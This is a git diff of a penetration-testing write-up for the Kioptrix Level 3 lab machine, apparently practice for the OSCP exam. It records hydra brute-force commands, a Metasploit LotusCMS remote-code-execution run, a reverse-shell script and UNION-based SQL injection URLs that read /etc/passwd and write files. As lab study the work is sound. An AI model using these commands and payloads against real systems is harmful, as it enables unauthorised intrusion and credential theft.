@@ -30,9 +30,26 @@ By Kioptrix
 * No unusual parameters in the POST request made for every login attempt. There is a `PHPSESSID` cookie but that would not stop our brute-forcing attempts in this instance.
 ![](/screenshots/kioptrix-level-3/httpLoginPostRequestIntercepted.jpg)
 * All failed login attempts, including failed SQL injection attempts such as `' or 1=1 --` and `' or '1=1' --`, resulted in a `200 OK` response from the server.
-* I tried 3 hydra bruteforce attempts in total: `hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.2.15 http-form-post '/index.php?system=Admin&page=loginSubmit:username=^USER^&password=^PASS^:username or password'`. First was with the failure string `incorrect`, which turned out to be a wrong one to look out for because there was another error string that I left out. For an invalid set of login credentials, the error message was ``. For an empty field in either of the username or password, the error message was ``. After getting the failure string right, I tried brute-forcing for user `loneferret`. All of these 3 attempts came up to nothing.
+* I tried 3 hydra bruteforce attempts in total: `hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.2.15 http-form-post '/index.php?system=Admin&page=loginSubmit:username=^USER^&password=^PASS^:username or password'`. First was with the failure string `incorrect`, which turned out to be a wrong one to look out for because there was another error string that I left out. For an invalid set of login credentials, the error message was `Incorrect username or password.`. For an empty field in either of the username or password, the error message was `Username or password left blank.`. After getting the failure string right, I tried brute-forcing for user `loneferret`. All of these 3 attempts came up to nothing.
 * Next, I searched for version=specific exploits and found `LotusCMS 3.0 eval() Remote Command Execution`, which has a Metasploit module for it (its Rapid7 page is found [here](https://www.rapid7.com/db/modules/exploit/multi/http/lcms_php_exec)). I was not sure what version of LotusCMS we were facing here, but a shot at it reveals that it does not work in our case:
 ![](/screenshots/kioptrix-level-3/metasploitLotusCms3.0AttemptFail.jpg)
+* **Re-visit**: I spent a day and a half on this machine and still could not get a (low privilege) shell, and decided to look for a hint - and realised that I was actually looking at the correct exploit - but had run it incorrectly! Sigh - somehow I overlooked this several times. The `URI` should have been `/index.php?system=Admin`:
+![](/screenshots/kioptrix-level-3/metasploitLotusCms3.0ExploitShell.jpg)
+* Finally, we have now got a shell with ourselves as `www-data`.
+* Note: I had also used the `php/reverse_php` payload instead of the original meterpreter payload because I did not require the other additional features that it gave (and also lack of familiarity at the moment with the syntax).
+* Note: The initial command that is executed (`id`) in this case took a while for the output to be returned to us (and it does not appear to be a one-off thing).
+* Running `python -c 'import pty; pty.spawn("/bin/bash")'` to get our interactive TTY shell somehow makes the shell session hang...
+* Since the shell returned using Metasploit wasn't stable enough for me, I decided to try out the [second Google result shown](https://github.com/Hood3dRob1n/LotusCMS-Exploit) (when searching for a version-related exploit) - which is a GitHub script.
+* Note-to-self: Maybe I should try such results, just in case I got the Metasploit attempt wrong (again).
+* Fun fact: If I had visited the script, one of the examples (which had `kioptrix3` in it) would have been a giveaway that this exploit should be used.
+* After downloading the script, give it executable permissions, and run it. This was the most interactive script that I've seen (note: the IP and port that it is referring to that of the Kali VM).
+![](/screenshots/kioptrix-level-3/shellUsingGithubScript.jpg)
+* The netcat shell is a lot more stable now - run `python -c 'import pty; pty.spawn("/bin/bash")'` to get our interactive TTY shell.
+* Trying a couple of kernel exploits here, but none currently work at the moment:
+1. 33322.c : buf: 0xffffffff Segmentation fault
+2. 9083.c 64-bits only
+3. 40812.c #include "exp_framework.h" missing
+* Note: I could not use `wget` to download Exploit-DB's code straight, due to SSL errors. Using `vim` in the shell session established was also problematic - the first line of the code seemed to always be missing. Hence, the best way was to use `wget` to download the code from our Kali machine and compile it on the vulnerablle machine itself.
 
 ### Discovering More Pages/Directories ###
 * No `robots.txt` file was found.
@@ -53,7 +70,7 @@ By Kioptrix
 * These 2 pages confirm that the version of phpMyAdmin that we found earlier is most likely what it is, based on the related pages discovered:
 ![](/screenshots/kioptrix-level-3/httpPhpMyAdminVersionConfirmation.jpg)
 * At this point, I had exhausted where my enumeration and decided to finally edit our `/etc/hosts` file (as mentioned earlier). I did not do this earlier because I was in the midst of my `hydra` attempts and did not want to interrupt them.
-* Side-note: The fact that this mapping was explictly mentioned in the VulnHub page probably highlighted its importance (which is indeed the case as we see later) - but nonetheless, we won't be having any of such explicit mentions in our OSCP exam.
+* Side-note: The fact that this mapping was explictly mentioned in the VulnHub page and in the login screen when booting up the vulnerable machine definitely highlighted its importance (which is indeed the case as we see later) - but nonetheless, we won't be having any of such explicit mentions in our OSCP exam (and I wanted to practise enumerating what we found to the fullest first).
 
 ### Gallery Section Exploration ###
 * Loading the `http://kioptrix3.com/gallery` shows us a gallery page that has several photos:
@@ -97,7 +114,7 @@ By Kioptrix
 * The set of credentials which we had obtained from the SQL injection is `admin:n0t7t1k4`. Tried it on `http://10.0.2.15/index.php?system=Admin` and `http://10.0.2.15/phpmyadmin/`, but both failed to log us in. Finally, I tried it on `http://10.0.2.15/gallery/gadmin/` and we are in!
 ![](/screenshots/kioptrix-level-3/httpGalleryGadminLoginSuccess.jpg)
 * The `Comments` system is disabled, as shown from the missing `/comments.php` when trying to `View comments` from the `Dashboard`.
-* Heading to `Presentation` > `Theme Editor`, we find that we are able to view the source code of various parts of the Gallarific site. However, we do not have permissions to edit the source code.
+* Heading to `Presentation` > `Theme Editor`, we find that we are able to view the source code of various parts of the Gallarific site. However, we do not have permissions to edit the source code. I skimmed through the various sections of the source code but did not find anything useful.
 ![](/screenshots/kioptrix-level-3/httpGalleryThemeEditor.jpg)
 * Since we could not edit the source code manually, I headed to `Themes` and managed to change the theme to another colour, which contains the original general Gallarific template. We are able to see the new changes at `http://kioptrix3.com/gallery/`. Nothing much that is unexpected. 
 * Navigating to `Users`, I found that we as `admin` (with the `Super User` role), were the only user on the platform.
@@ -118,6 +135,8 @@ I could not manage to get Burp Suite to intercept both the request and response 
 2. Finding out what that the current user was `root`: `/gallery.php?id=null+and+1=2+union+select+1,user(),3,4,5,6+from+gallarific_users--`
 3. Getting the current database directory location, which is `/var/lib/mysql/`:`/gallery.php?id=null+and+1=2+union+select+1,@@datadir,3,4,5,6+from+gallarific_users--`
 4. Loading the `/etc/passwd` file contents: `/gallery.php?id=null+and+1=2+union+select+1,load_file('/etc/passwd'),null,4,5,6+from+gallarific_users--`
+![](/screenshots/kioptrix-level-3/httpGalleryGallerySQLInjectEtcPasswdFile.jpg)
+* We are able to confirm that `loneferret` has an account on the server.
 * Note: We see `null` instead of `3` after `load_file`, so as not to print the number as part of our output. 
 * Alternative (slight modification at start of SQL string): `/gallery.php?id=null+union+all+select+1,load_file('/etc/passwd'),null,4,5,6+from+gallarific_users--`
 5. Write a file to `/tmp` directory: `/gallery.php?id=null+and+1=2+union+select+1,"This message is being written to /tmp/testFile.txt",3,4,5,6+INTO+OUTFILE+'/tmp/sampleWrite.txt'--`
@@ -129,14 +148,17 @@ I could not manage to get Burp Suite to intercept both the request and response 
 * `Errcode: 13` was given when I tried to write `/etc/sampleWrite.txt`, or `/var/www/sampleWrite.txt`. From this, we can probably deduce that `/var/www/html` did not exist, and that we are restricted from being able to write to `/var/www`.
 * I tried to write `/var/www/kioptrix/sampleWrite.txt` and `/var/www/kioptrix3/sampleWrite.txt`, but both failed as well.
 * **Note-to-self**: The whole idea was to write our PHP reverse shell code into an accessible page, and run it from our browser.
+* **Re-visit**: After finding the first method to get a shell through the LotusCMS avenue, I wanted to find other methods which I had missed it - and it turns out that we should have searched for tables relating to user information and gotten their credentials! The person did it using `sqlmap` in the walkthrough that I read, so **note-to-self and to-do**: if `sqlmap` has been explictly disallowed for OSCP, are there any other alternatives to it that is allowed, or do we really have to manually craft the SQL injection strings and find our way forward?
 
 ## SSH service at Port 22 ##
 * Tried to login as `root` - nothing special here (no banners or whatsover).
 ![](/screenshots/kioptrix-level-3/sshLoginAttemptRoot.jpg)
 * After getting a set of credentials `admin:n0t7t1k4`, I tried to login here but to no avail.
+* After confirming that `loneferret` has an account, I decided to brute-force with the `rockyou.txt` wordlist, but after running it for a few thousands tries for half an hour, I don't think it worked out.
 
 # Concluding Remarks
-To-be-added
+
 
 # Other Walkthrough References
-1. To-be-added
+1. https://kongwenbin.wordpress.com/2016/10/30/writeup-for-kioptrix-level-1-2-3/
+2. https://medium.com/@Kan1shka9/kioptrix-level-1-2-walkthrough-74753598a6fd
